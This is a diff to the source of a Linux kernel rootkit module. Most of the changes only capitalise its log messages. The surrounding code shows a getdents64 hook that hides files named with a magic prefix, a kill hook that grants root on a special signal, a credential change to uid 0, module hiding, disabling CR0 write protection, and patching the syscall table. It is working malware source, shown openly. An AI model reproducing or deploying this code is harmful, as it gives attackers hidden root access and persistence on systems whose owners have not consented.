@@ -101,7 +101,7 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
 			dir = (void *)kdirent + off;
 			if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)
 			{
-				printk(KERN_INFO "rootkit: hiding file with name %s\n",dir->d_name);
+				printk(KERN_INFO "rootkit: Hiding file with name %s\n",dir->d_name);
 				if (dir == kdirent) {
 					ret -= dir->d_reclen;
 					memmove(dir, (void *)dir + dir->d_reclen, ret);
@@ -127,7 +127,7 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
 // https://www.kernel.org/doc/html/latest/security/credentials.html
 void give_root(void)
 {
-	printk(KERN_INFO "rootkit: attempting to transition current uid to 0\n");
+	printk(KERN_INFO "rootkit: Attempting to transition current uid to 0\n");
 	struct cred *newcreds;
 	newcreds = prepare_creds();
 	//unlocks kernel cred mutex so they can be changed
@@ -137,7 +137,7 @@ void give_root(void)
 	newcreds->fsuid.val = newcreds->fsgid.val = 0;
 	//commits creds and lock mutex
 	commit_creds(newcreds);
-	printk(KERN_INFO "rootkit: successfully transitioned current uid to 0\n");
+	printk(KERN_INFO "rootkit: Successfully transitioned current uid to 0\n");
 
 }
 
@@ -171,7 +171,10 @@ void module_hide(void)
 asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 {
 	int sig = (int) pt_regs->si;
-	printk(KERN_INFO "rootkit: snooped on signal %d\n", sig);
+	if(sig) //system can throw a lot of 0 signals
+	{
+		printk(KERN_INFO "rootkit: Snooped on signal %d\n", sig);
+	}
 	switch (sig) {
 		case SIGSUPER:
 			give_root();
@@ -202,12 +205,12 @@ static inline void write_cr0_forced(unsigned long val)
 static inline void protect_memory(void)
 {
 	write_cr0_forced(cr0);
-	printk(KERN_INFO "rootkit: set cr0 to protect\n");
+	printk(KERN_INFO "rootkit: Set cr0 to protect\n");
 }
 static inline void unprotect_memory(void)
 {
 	write_cr0_forced(cr0 & ~0x00010000);
-	printk(KERN_INFO "rootkit: set cr0 to unprotected\n");
+	printk(KERN_INFO "rootkit: Set cr0 to unprotected\n");
 
 }
 
@@ -219,7 +222,7 @@ static int __init rootkit_init(void)
 	__sys_call_table = get_syscall_table();
 	if (!__sys_call_table)
 	{
-		printk(KERN_INFO "rootkit: failed to locate sys_call_table\n");
+		printk(KERN_INFO "rootkit: Failed to locate sys_call_table\n");
 		return -1;
 	}
 
